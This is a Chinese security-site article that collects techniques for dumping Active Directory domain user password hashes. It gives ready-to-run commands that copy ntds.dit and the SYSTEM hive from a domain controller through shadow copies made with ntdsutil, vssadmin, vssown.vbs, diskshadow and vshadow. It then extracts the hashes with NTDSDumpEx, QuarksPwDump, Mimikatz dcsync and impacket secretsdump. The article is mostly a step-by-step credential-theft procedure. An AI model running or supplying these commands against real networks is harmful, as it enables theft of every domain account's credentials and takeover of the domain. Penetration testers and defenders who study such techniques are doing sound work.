---
title: 导出域用户hash姿势总结
url: https://www.anquanke.com/post/id/286257
source: 安全客-有思想的安全新媒体
date: 2023-02-16
fetch_date: 2025-10-04T06:45:13.781129
---

# 导出域用户hash姿势总结

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# 导出域用户hash姿势总结

阅读量**316335**

发布时间 : 2023-02-15 17:30:43

**x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![]()

## 一、域用户hash导出原理

ntds.dit为ad的数据库，内容有域用户、域组、用户hash等信息，域控上的ntds.dit只有可以登录到域控的用户（如域管用户、DC本地管理员用户）可以访问。
ntds.dit包括三个主要表：数据表、链接表、sd表。所以只要在域渗透中能够获取到ntds.dit就可以获取到所有域用户的用户名和对应的hash，ntds.dit是加密的，需要获取system文件来解密。

ntds.dit文件位置: `C:\Windows\NTDS\NTDS.dit`
system文件位置:`C:\Windows\System32\config\SYSTEM`

在通常的情况下,即使我们拥有域管理员权限也无法读取ntds.dit文件,因为活动目录始终访问着这个文件,所以禁止读取,使用windows的本地卷影拷贝可以获得文件的副本。

## 二、ntds.dit和system文件提取

### 0x01 ntdsutil

Ntdsutil.exe 是一个为 Active Directory 提供管理设施的命令行工具。您可使用 Ntdsutil.exe 执行 Active Directory 的数据库维护，管理和控制单个主机操作，创建应用程序目录分区，以及删除由未使用 Active Directory 安装向导 (DCPromo.exe) 成功降级的域控制器留下的元数据。—— 百度百科
简单讲，Ntdsutil.exe就是一个AD域的命令行工具，可以复制域控系统快照并从中提取ntds.dit文件。

#### 创建快照

`ntdsutil snapshot "activate instance ntds" create quit quit`

![]()

#### 加载快照

`ntdsutil snapshot "mount {0cf3ebc8-3f7a-415f-95f7-8e8cf923cecb}" quit quit`

![]()

#### 拷贝快照中的ntds.dit和system文件

`copy C:\$SNAP_202302081523_VOLUMEC$\Windows\NTDS\ntds.dit C:\users\administrator\desktop\`
`copy C:\$SNAP_202302081523_VOLUMEC$\Windows\System32\config\SYSTEM C:\users\administrator\desktop\`

![]()

#### 卸载快照并删除

`ntdsutil snapshot "unmount {0cf3ebc8-3f7a-415f-95f7-8e8cf923cecb}" "delete {0cf3ebc8-3f7a-415f-95f7-8e8cf923cecb}" quit quit`

![]()

### 0x02 vssadmin

vssadminn是Windows Server 2008及 Windows 7提供的VSS管理工具，可用于创建和删除卷影拷贝、列出卷影拷贝的信息（只能管理系统Provider 创建的卷影拷贝)、显示已安装的所有卷影拷贝写入程序( writers )和提供程序( providers )，以及改变卷影拷贝的存储空间(即所谓的“diff空间”)的大小等。

![]()

#### 创建卷影拷贝

`vssadmin create shadow /for=c:`

![]()

#### 拷贝卷影中的ntds.dit和system文件

`copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\NTDS\ntds.dit c:\users\administrator\desktop\ntds.dit`
`copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SYSTEM C:\users\administrator\desktop\SYSTEM`

![]()

#### 删除卷影拷贝

`vssadmin delete shadows /for=c: /quiet`

![]()

### 0x03 vssown.vbs

功能和vssadmin类似，一个可视化的脚本，可以创建和删除卷影副本，从卸载的卷影副本运行任意可执行文件，以及启动和停止卷影复制服务。
下载地址：[vssown.vbs](https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs)

#### 启动卷影拷贝服务

`cscript vssown.vbs /start`

![]()

#### 创建卷影拷贝

`cscript vssown.vbs /create c`

![]()

#### 列出卷影信息

`cscript vssown.vbs /list`

![]()

#### 拷贝卷影中的ntds.dit和system文件

`copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\ntds\ntds.dit C:\users\administrator\desktop\ntds.dit`
`copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\system32\config\SYSTEM C:\users\administrator\desktop\SYSTEM`

![]()

#### 删除卷影拷贝

`cscript vssown.vbs /delete {FBC1881F-ADF7-411B-AF81-2BE16D400A15}`

![]()

### 0x04 diskshadow

DiskShadow是Microsoft签名的二进制文件，用于协助管理员执行与卷复制服务（VSS）相关的操作。该文件可以使用脚本模式，执行脚本中的所有命令，因此可以将拷贝ntds.dit文件的命令写入脚本中(c:\1.txt)：

```
#设置卷影拷贝
set context persistent nowriters

#添加卷
add volume c: alias someAlias

#创建快照
create

#分配虚拟磁盘盘符
expose %someAlias% g:

#复制ntds.dit和system文件
exec "cmd.exe" /c copy g:\windows\ntds\ntds.dit c:\users\administrator\desktop\ntds.dit && copy g:\windows\system32\config\SYSTEM c:\users\administrator\desktop\SYSTEM

#删除所有快照
delete shadows all

#重置
reset

#退出
exit
```

命令行执行：

```
diskshadow.exe /s c:\1.txt
#注意这里一定要将目录切到c:\windows\system32下，不然会报错，脚本中的注释去掉
```

![]()

### 0x05 vshadow

vshadow是一个简单的指令行工具，它允许任何人创建卷影拷贝。用户可以在最新版本的VSS SDK中找到这个工具。功能类似vssadmin，需要将系统对应版本的vshadow程序拷贝到系统中。

方法一：

#### 创建卷影拷贝

`vshadow-2008-r2-x64.exe -exec=%ComSpec% C:`

![]()

#### 拷贝卷影中的ntds.dit和system文件

`copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy6\windows\ntds\ntds.dit c:\users\administrator\desktop\ntds.dit`
`copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy6\windows\system32\config\SYSTEM c:\users\administrator\desktop\SYSTEM`

![]()

#### 卸载卷影

无需卸载，不会留下挂载痕迹。

方法二：

将vshadow-2008-r2-x64.exe改名为vshadow.exe，放在c.bat同目录下，命令行执行：
`c.bat c:\windows\ntds\ntds.dit c:\`

![]()

公众号回复vshadow获取工具，解压密码：公众号黑客前沿

## 三、获取hash

### 0x01 NTDSDumpEx

ntds.dit和system文件拷贝到本地，NTDSDumpEx执行以下命令：
`NTDSDumpEx.exe -d ntds.dit -s system`

![]()

工具下载地址：[NTDSDumpEx](https://github.com/zcgonvh/NTDSDumpEx)

### 0x02 QuarksPwDump

#### 本地导出

`QuarksPwDump.exe --dump-hash-domain -sf system -nt ntds.dit`

![]()

#### 域控机器导出

无需system文件
`QuarksPwDump.exe --dump-hash-domain -nt ntds.dit`

![]()

项目地址：[QuarksPwDump](https://github.com/quarkslab/quarkspwdump/)

### 0x03 Mimikatz

在域控机器执行
`Mimikatz "lsadump::dcsync /domain:test.com /all /csv" exit`

![]()

工具下载地址：[Mimikatz](https://github.com/gentilkiwi/mimikatz)

### 0x04 impacket

kali下安装impacket

```
git clone https://github.com/SecureAuthCorp/impacket
cd impacket
python3 -m pip install .
python3 setup.py install
cd examples
```

将ntds.dit和system文件拷贝到kali桌面，执行命令
`python3 secretsdump.py -ntds /home/kali/Desktop/ntds.dit -system /home/kali/Desktop/SYSTEM LOCAL`

![]()

本文翻译自 原文链接。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**黑客前沿**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/286257](/post/id/286257)

安全KER - 有思想的安全新媒体

本文转载自:

如若转载,请注明出处：

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [域控hash](/tag/%E5%9F%9F%E6%8E%A7hash)

**+1**0赞

收藏

![](https://p0.ssl.qhimg.com/t010857340ce46bb672.jpg)黑客前沿

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p1.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p0.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=167984)

[黑客前沿](/member.html?memberId=167984)

这个人太懒了，签名都懒得写一个

* 文章
* **5**

* 粉丝
* **1**

### TA的文章

* ##### [CVE-2023-0669 GoAnywhereMFT反序列化漏洞复现](/post/id/286390)

  2023-02-17 15:30:42
* ##### [解决win7嵌入式系统无法DoublePulsar问题](/post/id/285776)

  2023-02-16 17:30:52
* ##### [导出域用户hash姿势总结](/post/id/286257)

  2023-02-15 17:30:43
* ##### [小皮面板RCE复现](/post/id/286115)

  2023-02-14 17:30:38
* ##### [实战记录之曲线救国](/post/id/284600)

  2023-01-11 17:30:42

### 相关文章

* ##### [为AI Agent行为立“规矩”——字节跳动提出Jeddak AgentArmor智能体安全框架](/post/id/312426)

  2025-09-28 13:43:32
* ##### [教你打造一款AI安全助手 | 安全MCP的实践指南](/post/id/311884)

  2025-09-05 10:40:51
* ##### [当数字世界的“万能钥匙”被滥用，谁来守护核心资产？火山的 MCP 安全授权新范式](/post/id/311597)

  2025-08-28 09:50:41
* ##### [Python代码保护之重置操作码映射的攻与防探究（一）](/post/id/311484)

  2025-08-26 10:49:47
* ##### [广汽集团×火山引擎：出海合规助力企业新增长](/post/id/311498)

  2025-08-26 10:17:09
* ##### [从技术到安全：中科固源拆解车载以太网的演进路径与防护策略](/post/id/310094)

  2025-08-21 21:48:41
* ##### [智能体防御 | 一文了解3种系统提示词加固方法](/post/id/311279)

  2025-08-18 16:34:50

### 热门推荐

文章目录

* [一、域用户hash导出原理](#h2-0)
* [二、ntds.dit和system文件提取](#h2-1)
  + [0x01 ntdsutil](#h3-2)
  + [0x02 vssadmin](#h3-3)
  + [0x03 vssown.vbs](#h3-4)
  + [0x04 diskshadow](#h3-5)
  + [0x05 vshadow](#h3-6)
* [三、获取hash](#h2-7)
  + [0x01 NTDSDumpEx](#h3-8)
  + [0x02 QuarksPwDump](#h3-9)
  + [0x03 Mimikatz](#h3-10)
  + [0x04 impacket](#h3-11)

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)